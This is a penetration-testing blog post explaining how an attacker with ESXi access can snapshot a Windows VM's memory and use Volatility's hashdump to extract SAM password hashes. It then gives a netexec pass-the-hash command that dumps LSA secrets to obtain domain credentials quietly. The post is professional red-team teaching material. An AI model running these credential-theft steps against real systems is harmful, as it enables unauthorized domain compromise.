---
title: Offline Memory Forensics With Volatility
url: https://www.blackhillsinfosec.com/offline-memory-forensics-with-volatility/
source: Black Hills Information Security, Inc.
date: 2025-04-09
fetch_date: 2025-10-06T22:06:46.680139
---

# Offline Memory Forensics With Volatility

[![Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/wp-content/uploads/2025/03/BHIS_TEXT_BHIS.png)](https://www.blackhillsinfosec.com "Black Hills Information Security, Inc.")

[RSS](https://www.blackhillsinfosec.com/feed/)

* [All Services](https://www.blackhillsinfosec.com/services/)
  + [Complete Service Guide](https://www.blackhillsinfosec.com/services/complete-service-guide/)
  + [Active SOC](https://www.blackhillsinfosec.com/services/active-soc/)
  + [AI Security Assessments](https://www.blackhillsinfosec.com/services/ai-security-assessments/)
  + [Blockchain Security](https://www.blackhillsinfosec.com/services/blockchain-security/)
  + [Blue Team Services](https://www.blackhillsinfosec.com/services/blue-team-services/)
  + [Continuous Penetration Testing](https://www.blackhillsinfosec.com/services/antisoc/)
  + [High-Profile Risk Assessments](https://www.blackhillsinfosec.com/services/high-profile-risk-assessments/)
  + [Incident Response](https://www.blackhillsinfosec.com/services/incident-response/)
  + [Penetration Testing](https://www.blackhillsinfosec.com/services/)
* [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Email Sign-Up](https://mailchi.mp/blackhillsinfosec.com/bhis-sign-up)
* [About Us](https://www.blackhillsinfosec.com/who-we-are/)
  + [Security Consultants](https://www.blackhillsinfosec.com/about/security-analysts/)
  + [Admin](https://www.blackhillsinfosec.com/about/admin-staff/)
  + [SOC Team](https://www.blackhillsinfosec.com/about/soc-team/)
  + [BHIS Family of Companies](https://www.blackhillsinfosec.com/bhis-tribe-of-companies/)
* [Free Resources](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Blogs](https://www.blackhillsinfosec.com/blog/)
  + [Free Cybersecurity Tools](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Free Cybersecurity Webcasts](https://www.blackhillsinfosec.com/free_cybersecurity_webcasts/)
  + [Podcasts](https://podcasts.apple.com/us/podcast/black-hills-information-security/id1410835265)
  + [RITA](https://www.activecountermeasures.com/free-tools/rita/)
* [Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [BHIS & Antisyphon Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [WWHF Conference](https://wildwesthackinfest.com)
* [Online Community](https://blackhillsinfosec.com/community)
  + [Discord](https://discord.gg/BHIS)
  + [LinkedIn](https://www.linkedin.com/company/black-hills-information-security/)
  + [YouTube](https://www.youtube.com/c/BlackHillsInformationSecurity/videos)
  + [Bluesky](https://bsky.app/profile/bhinfosecurity.bsky.social)
  + [Twitter/X](https://twitter.com/BHinfoSecurity)
  + [Upcoming Events](https://blackhillsinfosec.com/events)
* [Fun Stuff](https://spearphish-general-store.myshopify.com/)
  + [Backdoors & Breaches](https://www.blackhillsinfosec.com/tools/backdoorsandbreaches/)
  + [Merch, Zines & More](https://spearphish-general-store.myshopify.com/)
  + [PROMPT# Zine](https://www.blackhillsinfosec.com/prompt-zine/)
  + [REKCAH](https://www.blackhillsinfosec.com/rekcah/)
  + [Books](https://www.blackhillsinfosec.com/tools/books/)

8
Apr
2025

[Ben Bowman](https://www.blackhillsinfosec.com/category/author/ben-bowman/), [How-To](https://www.blackhillsinfosec.com/category/how-to/), [Informational](https://www.blackhillsinfosec.com/category/informational/), [Red Team](https://www.blackhillsinfosec.com/category/red-team/), [Red Team Tools](https://www.blackhillsinfosec.com/category/red-team/tool-red-team/)
[Forensics](https://www.blackhillsinfosec.com/tag/forensics/), [Memory Forensics](https://www.blackhillsinfosec.com/tag/memory-forensics/), [Volatility](https://www.blackhillsinfosec.com/tag/volatility/)

# [Offline Memory Forensics With Volatility](https://www.blackhillsinfosec.com/offline-memory-forensics-with-volatility/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/02/BBowman-150x150.png)

| [Ben Bowman](https://www.blackhillsinfosec.com/team/ben-bowman/)

Ben Bowman is a Security Analyst at Black Hills Information Security. He graduated in 2024 with a degree in cyber operations. Ben conducts research as well as tool development outside of testing.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/BLOG_chalkboard_00716.png)

As attackers, we often have one goal: dig as deep and as fast as you can. But what happens when you hit a wall with nowhere else to go? Memory forensics may provide a way out. What if you get access to ESXi and all you can do is take snapshots? You can’t add yourself to the ESXi domain group, you can’t find any unlocked computers… so now what?

### **Offline Memory Analysis**

This scenario is where [Volatility](https://github.com/volatilityfoundation/volatility) comes into play. Volatility is a memory forensics tool that can pull SAM hashes from a vmem file. These hashes can be used to escalate from a local user or no user to a domain user leading to further compromise. The following example scenario will showcase the steps involved in this process.

#### Scenario

Imagine you are in a network, and you find an IPMI hash disclosure vulnerability on a server. You dump the hash and somehow successfully crack it. You log onto the server and note that the server hosts ESXi. From here, you attempt to authenticate to ESXi using the credentials, which, to your surprise, works. Now what? Well, you could take the loud and noisy route and poke all the VMs and hope for the best. Alternatively, you could find a Windows VM, take a snapshot, pull the administrator credentials out of it, and relay the creds to dump LSA and get a domain account without making any noise.

### **Hands On**

#### Local Admin

Start by ensuring you have the proper permissions and take a snapshot of a Windows domain joined Virtual Machine.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Picture-1.png)

Take Snapshot

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Picture-2.png)

VM Create

Make sure you check the “Include Virtual Machine’s Memory” box.

Once the snapshot is made, navigate to the snapshot and locate the vmem file. Download it to a Linux host.

Once you have the file, you’ll need to download Volatility.

```
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/
python3 -m venv venv && . venv/bin/activate
pip install -e .[dev]
```

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Picture3.png)

Installing Volatility3

Once the tool is installed, we are ready to pull SAM credentials for local administrator credentials.

Side Note: This command could be useful in finding out which EDR is in use.

```
python3 vol.py -f ~/Downloads/virtualmachine.vmem windows.pslist
```

Run the following command against the vmem file to extract SAM credentials.

```
python3 vol.py -f ~/Downloads/virtualmachine.vmem windows.hashdump.Hashdump
```

The following should dump into your terminal.

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/04/Picture4.png)

Dumped SAM Hashes

From here, you can relay the credential hashes at the same host with netexec and get lsass and get domain account credentials.

```
Netexec smb <IP> -u Administrator -H <HASH> --local-auth --lsa
```

The rest is self-explanatory; you should now be the proud owner of a domain account or two.

### **Conclusion**

Sometimes the best way to approach an attack is with novel ideas, ones that defenders don’t see coming. Defending against memory analysis is extremely difficult and worth trying on your next engagement.

---

---

Ready to learn more?

Level up your skills with affordable classes from Antisyphon!

**[Pay-Forward-What-You-Can Training](https://www.antisyphontraining.com/pay-forward-what-you-can/)**

Available live/virtual and on-demand

![](https://www.blackhillsinfosec.com/wp-content/uploads/2...